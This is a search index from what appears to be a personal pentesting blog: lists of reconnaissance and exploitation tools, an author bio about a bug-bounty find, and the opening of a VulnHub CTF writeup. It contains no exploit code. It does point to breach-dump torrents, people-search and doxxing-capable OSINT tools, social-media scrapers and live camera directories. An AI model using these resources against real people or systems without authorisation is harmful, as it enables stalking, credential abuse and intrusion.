","date":"11-29-2023","objectID":"/exploitation/:0:7","tags":["Exploitation","Initial Access","Tools","Resources","Defense Evasion"],"title":"Exploitation Resources","uri":"/exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Wireless aircrack-ng - (Built-in) AIO wireless security suite. Contains both passive and active recon tools, along with exploitation tools. ","date":"11-29-2023","objectID":"/exploitation/:0:8","tags":["Exploitation","Initial Access","Tools","Resources","Defense Evasion"],"title":"Exploitation Resources","uri":"/exploitation/"},{"categories":["Resources \u0026 Tools"],"content":"Additional Resources HackingArticles.in - (Website) Quick and simple walkthrough guides to various tools and techniques. HackTricks - (Website) Great resources for anything penetration testing and red teaming. 0xJs RedTeam CheatSheet - (GitHub Repo) CheatSheet to anything Red Team. SwissKy - (GitHub Repo) AIO repo focusing on webapp payloads but includes many other pentesting \u0026 red teaming resources. Home for the popular PayLoadAllTheThings repo. The Hive - (Website) Great resource to search and learn from. Holds many resources that other blogs may lack. Overall great to keep in your notes. ","date":"11-29-2023","objectID":"/exploitation/:0:9","tags":["Exploitation","Initial Access","Tools","Resources","Defense Evasion"],"title":"Exploitation Resources","uri":"/exploitation/"},{"categories":null,"content":"whoami","date":"11-17-2023","objectID":"/whoami/","tags":null,"title":"","uri":"/whoami/"},{"categories":null,"content":"Hello world! whoami I’m a born computer nerd who’s trying to figure out how everything works. My path to cyber is fun and frustrating at the same time, so here’s a quick story… One day, I decided I wanted more out of my IT career and asked a cyber buddy where I should begin. He suggested that I apply myself in a home-built lab and obtain my Security+ certification, so I did just that. I started by purchasing a Security+ course on a major online learning platform and began studying. As I watched the Security+ course, I glanced at the page source to find the current video’s MP4 file exposed. I then force-browsed my way to the Security+ course’s root video directory, giving me access to all the Security+ course’s MP4 files… Big deal, right? I had paid for access. Well, after confirming this learning platform was part of a bug bounty program and that this discovery was in-scope, I wandered my way to a random unpaid-for course and found the directory structure by force-browsing from the course’s sample video URL. This ultimately led to the discovery of all the MP4 videos of the unpaid-for course! Did my intuition lead me to my first bug!? With the lack of experience I had, I was having a hard time believing the situation, so I confirmed the issue by looking over a few other courses, verifying the problem over and over. Despite my lack of experience with bug reporting, the report I submitted was effective. After a few days passed, I revisited the learning platform and verified that the issue had been fixed, while later receiving a reply on the bug bounty platform stating that no issues were found. Even though I was upset for not getting the recognition, I came out on top by learning two important things that day: I found my passion in cybersecurity, stemming from the idea of helping others protect their data. Making clear, concise, and detailed reports is very important! Anyways, why this blog? Provide a resource for others. 😃 Showcase my knowledge to employers. 😉 Now, go dig around! ","date":"11-17-2023","objectID":"/whoami/:0:0","tags":null,"title":"","uri":"/whoami/"},{"categories":["Resources \u0026 Tools"],"content":" Active Reconnaissance To gather intelligence by actively engaging the target. In the active reconnaissance phase, we’re planning our future phases, like exploitation, by actively collecting information on the target by enumeration, scanning, etc. Few examples: What targets were found and what ports are open? What software, versions, and configs are we up against? Any sensitive data or services found through fuzzing or crawling? Any hosts/services vulnerable to known exploits? Enumerate users, groups, GPOs, policies, etc All while we continue to map the possible network topology. This is a list of tools which use active reconnaissance techniques(E.g., Scanning, Fingerprinting, Enumeration, etc) to gather information on the target. Exploit Warning! Many Active Reconnaissance tools are capable of Executing Exploits! Regarding my notes: The brackets ( ) after each tool will indicate if the tool is: (Built-in) = Within Kali’s repo. If not already installed, run the following: sudo apt update \u0026\u0026 sudo apt install *tool-to-install* (External) = Outside Kali’s repo. It’ll need downloaded then installed. (Website) = Part of a website. There’s others but they’re self-explanatory. I’ll also try specifying any restrictions I know of. API access needed. Paywalls. etc. ","date":"11-03-2023","objectID":"/active-recon/:0:0","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration","Discovery"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Darkweb OnionScan - (External) “OnionScan is a free and open source tool for investigating the Dark Web.” Scan details at “What is scanned for”. ","date":"11-03-2023","objectID":"/active-recon/:0:1","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration","Discovery"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Domains Probe automation httprobe (External) “Take a list of domains and probe for working http and https servers.” Great for automating subdomain discovery prior to gowitness. Subdomains Amass by OWASP (Built-in) Open-source for enumerating and discovering subdomains. Active scanning, option -active, will attempt to gather TLS certificates, perform web crawling, DNS zone transfer, and NSEC(zone) walking. ","date":"11-03-2023","objectID":"/active-recon/:0:2","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration","Discovery"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Fuzzing AIO Fuzzing ffuf (Built-in) Fuzzer written in Go. Finds directory, files, V-Host, and GET and POST parameter fuzzing, etc. GoBuster (Built-in) Fuzzing tool written in Go. Used for Directory/File, DNS, V-Host, open S3 and cloud buckets, and TFTP servers. Wfuzz (Built-in) Anything web application fuzzer. E.g., RCE, VHost, etc. Replaces FUZZ reference with specified payload. Web Path Fuzzing DirBuster (Built-in) Multithread GUI/CLI Java app for fuzzing webapp files and directories. dirsearch (Built-in) An advanced web path brute-forcer for fuzzing directories and files. FeroxBuster (Built-in) “Forced Browsing” rust tool used for enumerating directories and files. Web Object Fuzzing DIRB (Built-in) Web-Object fuzzer. ","date":"11-03-2023","objectID":"/active-recon/:0:3","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration","Discovery"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Scanners Network Scanners Nmap (Built-in) The “goto” network and port scanner with many capabilities beyond scanning, e.g., built-in scripts for vulnerability testing, etc. CMS Scanners CMSmap (External) CMSmap is a python open source CMS scanner that automates the process of detecting security flaws of the most popular CMSs. WPScan (Built-in) WPScan WordPress security scanner. Written for security professionals and blog maintainers to test the security of their WordPress websites. joomscan by OWASP (Built-in) OWASP Joomla Vulnerability Scanner Project. Web Scanners Nessus (External) - Account creation required. Free for home use but limited to 15 hosts. Proprietary vulnerability scanner by Tenable. Has many additional scanning options like specialized scans, web app scans, etc. nikto (Built-in) Web server vulnerability scanner in perl. OpenVAS (Built-in) - Account creation required. Commercial and CE editions Component of the Greenbone Vulnerability Management suite. Sn1per (External) - Exploitation features tied to premium. API integration available! Open source recon and penetration testing framework. Premium and CE versions available. SNMP Scanners onesixtyone (Built-in) SNMP scanner which logs the software running on a device. Specialized Scanners log4j-scan (External) A fully automated, accurate, and extensive scanner for finding log4j RCE CVE-2021-44228. Supports lists of URLs, 60+ HTTP headers, Bypass payloads for WAFs(Web Application Firewall), etc. ItWasAllADream (External) CVE-2021-34527 (PrintNightmare) RCE python scanner. Scan entire subnets for PrintNightmare RCE(Remote code execution) and export CVS report. Does NOT apply to LPE(Local privilege escalation)! Only RCE! ","date":"11-03-2023","objectID":"/active-recon/:0:4","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration","Discovery"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Web * Web App Firewall WAFW00F (Built-in) Identify and fingerprint Web Application Firewall (WAF) products protecting a website. Web App Proxy BurpSuite (Built-in) - Free version has rate limited brute-forcing. Paid version has many features. AIO web app security testing. Free community extensions can help improve the free version. Zed Attack Proxy (ZAP) (Built-in) Free and open-source web app scanner. No limit on brute-force attempts. Foxy Proxy (Browser Extension) Browser proxy used with ZAP and Burp. Web TechStack Wappalyzer - (Browser Extension) Actively interacts with a website, when browsing to it, to find website’s tech stack in realtime. WhatWeb (Built-in) Default scan uses HTTP requests to identify website’s tech stack. Aggression is adjustable. Website Screenshots gowitness (External) - Requires chromium to be installed. “gowitness - a golang, web screenshot utility using Chrome Headless.” Great for automating external pentests by removing the manual process of visiting each found website. ","date":"11-03-2023","objectID":"/active-recon/:0:5","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration","Discovery"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Wireless aircrack-ng - (Built-in) AIO wireless security suite. Contains both passive and active recon tools, along with many exploitation tools. ","date":"11-03-2023","objectID":"/active-recon/:0:6","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration","Discovery"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Passive Reconnaissance To gather intelligence without actively engaging the target. In the passive recon phase, we’re planning our future steps by passively collecting information on the target by fingerprinting, using OSINT, etc. Few examples: Any email formats found? What names can we find related to the target? Sensitive data found on social media? Badges, passwords, or software icons in pics? Any exposed credentials in dumps? Repeat password patterns? What’s the business structure. Who holds the keys? Any sensitive information in open website/domain records? All while we continue to map the possible network topology. This is a list of tools which use passive reconnaissance techniques(E.g., OSINT, etc) to gather information on the target. Warning! Some Passive Reconnaissance tools may Actively Engage the Target. Regarding my notes: The brackets ( ) after each tool will indicate if the tool is: (Built-in) = Within Kali’s repo. If not already installed, run the following: sudo apt update \u0026\u0026 sudo apt install *tool-to-install* (External) = Outside Kali’s repo. It’ll need downloaded then installed. (Website) = Part of a website. There’s others but they’re self-explanatory. I’ll also try specifying any restrictions I know of. API access needed. Paywalls. etc. ","date":"10-28-2023","objectID":"/passive-recon/:1:0","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"AIO Tools Aware Online - (Website) Resources, tutorials, etc. Company based in Netherlands. awesome osint - (Website) Awesome OSINT is a large collection of resources dedicated to anything OSINT. Hunchly - (Chrome Extension) - Trial available Chrome extension for organizing your findings and exporting them. It can auto screenshot as you go. IntelTechniques - (Website) Great resource for OSINT anything. Tools included. _IntelligenceX - (Website) - Free account required. Tools which can be used for many different OSINT purposes. Email format validation, DNS records, etc Maltego CE - (Built-in) - APIs aren’t needed but can help widen your net. Great link analysis tool for the aggregated data it collects. Helps visualize paths of data points, etc. Maltego Essentials Youtube Playlist - Youtube playlist for learning Maltego. OSINT Combine - (Website) AIO site that hosts many useful online tools. E.g., Darkweb, socials, usernames, etc OSINT Framework - (Website) Fun interactive site that can help you see the paths of OSINT but, honestly, I’ve never use it. Pentest-Tools.com - (Website) - Limited without subscription. Many limited use tools. Access by clicking hamburger menu then Tools. recon-ng - (Built-in) “Open Source Intelligence gathering tool aimed at reducing the time spent harvesting information from open sources.” Great framework for OSINT gathering. It has a similar feeling to metasploit since it uses modules, “run”, etc ","date":"10-28-2023","objectID":"/passive-recon/:1:1","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"AIO VM Trace Labs Organization - (External - VM VMware \u0026 VirtualBox) “Trace Labs is a nonprofit organization whose mission is to accelerate the family reunification of missing persons while training members in the tradecraft of open source intelligence (OSINT).” This VM was created for OSINT. Updated regularly. Privacy focused. Trace Labs Github. Latest Trace Labs OSINT VM. ","date":"10-28-2023","objectID":"/passive-recon/:1:2","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Accounts(Usernames) CheckUserNames - (Website) Website that helps find where a username may be in use, or not in use. GHunt - (External \u0026 Website) CLI script, and online now, which can help you dig into anything Google, including accounts. iDCrawl - (Website) Search for usernames across different online platforms. Maigret - (External) Fork of Sherlock that creates a dossier of a person by username. NameChecker - (Website) Search for usernames across different online platforms. NameCheckUp - (Website) Search for usernames across different online platforms. Sherlock - (Built-in) “Hunt down social media accounts by username across social networks” Tool built-in to Kali which allows you to search many different social networks for a username. Sherlock’s Github Pages website WhatsMyName Web - (Website) A very thorough tool that searches the web for usernames and names. ","date":"10-28-2023","objectID":"/passive-recon/:1:3","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Breaches/Dumps Dumps 1.4B Breach Compilation - (Torrent Link) Rockyou2021.txt - Collection of wordlists combined - (Torrent Link) psbdmp.ws (Website) - API available. Biggest archive(database) of paste dumps. Search Breaches/Dumps search.0t.rocks (Website) 14B records to sift through. Older DB. DEHASHED (Website \u0026 API) - No account required but limited. API available through subscription. Search dumps and chain emails, hashes, and passwords while looking for reuse across different accounts. Breach Parse - (External) A tool for parsing breached passwords. Works well with 1.4B Breach Compilation. haveibeenpwned(HIBP) (Website \u0026 API) - API available through subscription. The website allows you to search through a large updated database of data dumps for either emails or passwords. It’s active and updated regularly. API subscription available. You send API the first 5 characters of a hash and API responses with a list of hashes matching the sent prefix. Facebook Data Breach Checker - (Website) Searches through 533 million Facebook accounts for dumped phone number. Uses k-anonymity to ensure privacy. LeakCheck - (Website) - Account required. Alternative to HIBP and dehashed. SnusBase - (Website) - Account required. Indexes information from websites which had data breaches. ","date":"10-28-2023","objectID":"/passive-recon/:1:4","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Bucket search engines S3 bucket search GrayHatWarfare (Website) - Free = limited range. Registered = double free range. Premium = unlimited w/ full path search. S3 bucket search engine. ","date":"10-28-2023","objectID":"/passive-recon/:1:5","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Businesses AIHIT - (Website) - Account creation and/or subscription may be needed. Company database aggregator. BBB - (Website) Local business search. Find phone numbers, addresses, names, and reviews/complaints. Bloomberg - (Website) - Account creation and/or subscription may be needed. Find history and news on a company, including public finances. OpenCorporates - (Website) Largest legal-entity database holding copyleft Open Database License. LinkedIn - (Website) Great place to find badge photos, employee lists, tech stack through job applications, etc. Companies may not share sensitive information but employees do. 😄 NerdyData - (Website) Get a list of websites that use certain technologies, plus the company’s tech spend data. ","date":"10-28-2023","objectID":"/passive-recon/:1:6","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Code Search grep.app - (Website) Search across a half million git repos. Great place to dig for leaked secrets, etc. RepoSearch - (Website) Search for source code across SVN and Github repos. PublicWWW - (Website) Search through a web page’s HTML, JS, and CSS code. Updated regularly. SearchCode - (Website) Searches Bitbucket, CodePlex, Fedora Project, Gitlab, Github, Gitorious, Google Android source codes. ","date":"10-28-2023","objectID":"/passive-recon/:1:7","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Darkweb Search Engines BizNar - (Website) Deep Web search engine. real-world-onion-sites - (Website) “This is a list of substantial, commercial-or-social-good mainstream websites which provide onion services.” ","date":"10-28-2023","objectID":"/passive-recon/:1:8","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Domains Domain AIO assetfinder - (Built-in) Domain and subdomain discovery using passive methods written in golang. CentralOps.net - (Website) Domain \u0026 network WHOIS, DNS records, service scan, traceroute, etc. ViewDNS.info - (Website) Collection of domain level tools. DNS \u0026 Records DNS Dumpster - (Website) DNS \u0026 Whois recon and research. dnsenum (Built-in) Multithreaded perl script that enumerates DNS information and non-contiguous IP blocks. DNSRecon (Built-in) Very flexible and effective DNS scanning and enumeration tool. Ability to use external passive means along with local wordlist fuzzing techniques for discovery. Fierce (Built-in) A DNS reconnaissance tool for locating non-contiguous IP space. Subdomains Amass by OWASP - (Built-in) Open-source CLI for enumerating and discovering subdomains. Defaults to passive recon but active is an option. CRT.sh - (Website) Search digital certificates of subdomains. Great subdomain tool! DNSlytics - (Website) Find domains sharing the same IP or subnet. SpyonWeb.com - (Website) Similar to DNSlytics above. Subfinder - (Built-in)- Many API options but not required. Passive subdomain enumeration using golang. Works really well even without APIs. Sublist3r - (Built-in) Python tool for enumerating subdomains via OSINT. Older but still useful in some situations. Was it a Tor Relay Exonerator(Tor Project) - (Website) Search IP and/or date to find out if IP was used as Tor relay. ","date":"10-28-2023","objectID":"/passive-recon/:1:9","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Emails ClearBit (Chrome Extension) - Account required. Confirm and cross reference emails found. DEHASHED (Website \u0026 API) - No account required but limited. API requires subscription. Chain emails, hashes, passwords and look for reuse across different accounts. Email Hippo (Website) - No account required. Verify if an email is real or fake. h8mail (External) - May require access to various APIs Email OSINT \u0026 Password breach hunting tool, locally or using premium services. Supports chasing down related email. Digs through local databases or remote databases for findings. API restrictions. hunter.io (Built-in and Website) - Free is limited. Email address search engine/parser. phonebook.cz (Website) - _Intelx account required(free). Email address search engine, plus more. Zen (External) - Supports HIBP API. Find emails of Github users. ","date":"10-28-2023","objectID":"/passive-recon/:1:10","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"File Search Engines Any File Type Search dedigger - (Website) Find public files in Google drives. File Pursuit - (Website) “Search the web for files, videos, audios, eBooks \u0026 much more.” FileSearch - (Website) Search archives, programs, videos, music, books, and more. DLL Dump - (Website) - Careful downloading DLLs. Malicious warning! Free collection of DLL files free for download. Document \u0026 Slide Search BASE - (Website) “BASE is one of the world’s most voluminous search engines especially for academic web resources.” CORE - (Website) Searches world’s largest collection of open access research papers. FreeFullPDF - (Website) “Find free scientific publications in PDF format” Google Scholar - (Website) Google search for anything scholar. Video Search deturl - (Website) Download any youtube video by adding “pwn” to beginning of youtube video… pwnyoutube.com/watch?v=********* filmot - (Website) Search within Youtube Subtitles. Youtube DataViewer - (Website) Quickly extract Youtube video data by providing link. ","date":"10-28-2023","objectID":"/passive-recon/:1:11","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Forums Search boardreader - (Website) Searches various forums, blogs, reviews and news via APIs. builtwithFlarum - (Website) Discover Flarum made discussion boards. ","date":"10-28-2023","objectID":"/passive-recon/:1:12","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"GeoLocation Search GeoLoc GeoCreepy - (External) Creepy Github A geolocation OSINT tool. Offers geolocation information gathering through social networking platforms. Google Earth - (Website) Google Earth. Find locations based on GPS coordinates, etc. Youtube GeoFind - (Website) Find GeoLocation information on Youtube channels, etc GeoLoc Practice GeoGuessr - (Website \u0026 Phone App) Game for everyone. Gamified OSINT through google maps. ","date":"10-28-2023","objectID":"/passive-recon/:1:13","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Images Exif Data ExifTool - (Built-in) CLI app for reading and writing exif, GPS, IPTC, XMP, and other meta info in image, audio, PDF, and video. libexif - (External) Library written in portable C. Read and writes exif metadata in image files. Reverse Image Search Foto Forensics - (Website) Provides access to cutting-edge tools for digital photo forensics. Service was retired but then recreated, by ‘Hacker Factor’ with the goal of providing “…a free service that provides an introduction to photo forensics.” Foto Forensics tutorial. Google Lens - (Website) AI driver reverse image search. Click the little colored camera to open upload feature. Upload image or input image URL. PimEyes - (Website) - Subscription may be needed. Try page source for found image URL? Reverse image search. For better results turn off safe search but results may become NSFW! TinyEye - (Website) Image search and recognition company with reverse image search. Stock Images FreeImages - (Website) Free stock images. Free Stocks - (Website) Free stock images. pixabay - (Website) Free stock images. unsplash - (Website) Free hi-res images. Unique. ","date":"10-28-2023","objectID":"/passive-recon/:1:14","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"IoT/Device Search censys - (Website) - Free account required for personal use. censys.com How-To Guide Netlas - (Website) Intel apps that provide IP address, domains, websites, web Apps, IoT, and other assets. Shodan.io - (Website) - Free account required. Lifetime subscriptions on sale at random. Shodan How-To Guide Search IP to do service scans. city:city - will show devices in city area. port:port - will search for port only. org:organization - will search org specified. ","date":"10-28-2023","objectID":"/passive-recon/:1:15","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Leaks Offshore Leaks Database - (Website) Search leak databases ","date":"10-28-2023","objectID":"/passive-recon/:1:16","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Online Cameras Insecam - (Website) Live camera directory. Uses Shodan to find cameras then indexes them. ","date":"10-28-2023","objectID":"/passive-recon/:1:17","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Organizations Trace Labs Organization - (Website - VM VMware \u0026 VirtualBox) “Trace Labs is a nonprofit organization whose mission is to accelerate the family reunification of missing persons while training members in the tradecraft of open source intelligence (OSINT).” This VM was created for OSINT. Updated regularly. Privacy focused. International Consortium of Investigative Journalists - (Website) Source for investigations, news, and host of publicly made leaks. They also take in leaked data. Innocent Lives Foundation - (Website) “Identify anonymous child predators and help bring them to justice. ","date":"10-28-2023","objectID":"/passive-recon/:1:18","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Persons Federal Bureau of Prisons - (Website) Searches prisons for inmates by number or name. Fast Background Check - (Website) Searches public records for personal information. It’s quick too. Fast People Search - (Website) Can find relatives, phone, address, etc. Decent at finding active phone numbers. iDCrawl - (Website) Person search engine. Photos, socials, usernames, address, etc. Jury Records - (Website) Searches jury cases for linked persons. peekyou - (Website) Uses other site searches to find person information. TruePeopleSearch - (Website) Finds address(with google maps), phone, relatives, associates, etc. Webmii - (Website) Person search but includes some social platforms too. White Pages - (Website) One of the largest person contact and background databases. ","date":"10-28-2023","objectID":"/passive-recon/:1:19","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Phone Numbers CallerID Test - (Website) - 5 searches a day. Free phone number search. Locates city, state, and phone provider. infobel - (Website) Phone search across North America, South America, Europe, Asia, Africa, Australia and the Pacific, and the Middle East. USA version called us-info true caller - (Website \u0026 Phone App) - Registration required. Searches phones numbers. Many cellular phones have this integrated for caller ID. ","date":"10-28-2023","objectID":"/passive-recon/:1:20","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Social Platforms Facebook Facebook Friend List Scraper - (External) “OSINT tool to scrape names and usernames from large friend lists on Facebook, without being rate limited.” fb-sleep-stats - (External) “Use Facebook to track your friends’ sleeping habits” Facebook ID Lookup - (Website) “Facebook ID finder can help you find your or someone’s Facebook numeric user ID easily” Instagram Tools By CodeOfaNinja - (Website) Various tools, including social ID finders. HashTagify - (Website) Search instagram hashtags. Osintgram - (External) “Osintgram is a OSINT tool on Instagram. It offers an interactive shell to perform analysis on Instagram account of any users by its nickname”. sterraxcyl - (External) “Instagram OSINT tool to export and analyze followers | following with their details”. Toutatis - (External) “Toutatis is a tool that allows you to extract information from instagram accounts such as e-mails, phone numbers and more”. LinkedIn InSpy - (External) Python based LinkedIn enumeration tool requiring Hunter.io API key. Pinterest Aware-Online Pinterest OSINT Guide - (Website) Reddit Subreddits - (Website) Discover new subreddits. Reddit Comment Search - (Website) Find all comments posted by user. Snapchat Snapchat Map - (Website) Built-in search engine for snapchat, including map. Telegram Telegram Nearby Map - (External) Discover the location of nearby Telegram users. Tumblr Tumblr 2013 data breach search - (Website) Twitter Nitter - (External \u0026 Website) Free and open source front-end for searching twitter(x) without an account. Nitter Github foller.me - (Website) “Twitter analytics shows followers, hashtags, topics, mentions, and other statistics for any public Twitter profile.” ","date":"10-28-2023","objectID":"/passive-recon/:1:21","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Threat Intel AlienVault - (Website) Open Threat Exchange neighborhood watch of the threat intel community. Rescure - (Website) Feeds of malicious IPs, domains, and Malware hashes updated every 24hrs. ","date":"10-28-2023","objectID":"/passive-recon/:1:22","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Voter Records Voter Records - (Website) Political research tool which searches public records released by US states. ","date":"10-28-2023","objectID":"/passive-recon/:1:23","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Web Web History Archive.org - (Website) OG Wayback Machine by Internet Archive. Archive.is - (Website) Archive tool which time capsules web pages. Visual Ping - (Website) Visually look at a webpages for changes. Stored.Website - (Website) Pulls web cache from selected source. waybackpack - (External) “Download the entire Wayback Machine archive for a given URL.” waybackpy - (External) API to interface with wayback machine APIs. Web Search Engines Google Google Hacking for Penetration Testers - (PDF) BlackHat presentation covering “Google Hacking for Penetration Testers”. Google Advanced Search - (Website) Helps you run Google operators aka dorks. Dork-Search.com - (Website) Google search techniques built into the search bar. Google-Dorking - (Website) Site of Google search techniques and tools. Google Guide - (Website) Small PDF guide to google search techniques \u0026 operators. Google Hacking Database - (Website) Google dorks created by offsec minded individuals. Google Trends - (Website) “Google Trends is a website by Google that analyzes the popularity of top search queries in Google Search across various regions and languages. The website uses graphs to compare the search volume of different queries over time.” per Wikipedia. Other Search Engines Aol - (Website) Aol search engine. Ask - (Website) Ask search engine. Baidu - (Website) China’s google… Bing - (Website) Microsoft search engine. Bing search guide. Advanced Bing search keywords. DuckDuckGo - (Website) Privacy focused search engine. DuckDuckGo search guide. Wolfram Alpha - (Website) Computational knowledge engine. Yahoo - (Website) Yahoo search engine. Yahoo search guide. Yandex - (Website) Russia’s google… Web Techstack BuiltWith - (Website) Search a websites techstack. netcraft - (Website) Find infrastructure and techstack. ","date":"10-28-2023","objectID":"/passive-recon/:1:24","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Wireless aircrack-ng - (Built-in) AIO wireless security suite. Contains both passive and active recon tools, along with many exploitation tools. WiGLE - (Website) Wireless Geographic Logging Engine. Searchable central database of world-wide wireless networks. ","date":"10-28-2023","objectID":"/passive-recon/:1:25","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Wordlists Wordlist Creation ceWL (Custom Word List Generator) - (Built-in) Ruby based app which crawls URL returns a list of words. CUPP (Custom User Passwords Profiler) - (Built-in) After OSINT, takes user input and creates a custom wordlist based off user input like birthday, name, etc. Mentalist - (External) Wordlist and rules creation tool. namemash.py - (External) Takes first and last name as user input and spits out possible combinations. Useful for after finding names via OSINT. Wordlist Downloads Bruteforce-database repo - (External) Various wordlists in one repo. InfoSecWarrior repo - (External) Various wordlists buried inside the repos. SecLists repo - (Built-in) Updated collection of wordlists. Located under /usr/share/wordlists/SecLists ","date":"10-28-2023","objectID":"/passive-recon/:1:26","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Additional OSINT Certifications McAfee Institute - (Website) More info @ CISA’s webpage. “The Certified in Open Source Intelligence (C|OSINT) program is the first and only globally recognized and accredited board certification on open source intelligence.” ","date":"10-28-2023","objectID":"/passive-recon/:1:27","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration","Discovery"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["VulnHub"],"content":"DC-3 from the DC-Series(VulnHub).","date":"02-07-2023","objectID":"/dc-3/","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"I enjoyed DC-2’s Tom \u0026 Jerry theme! It showed us the concept of credential reuse and weak passwords, along with the misconfigurations of wordpress and SUID set binary. Anyways, now onto DC-3.2 aka DC-3! 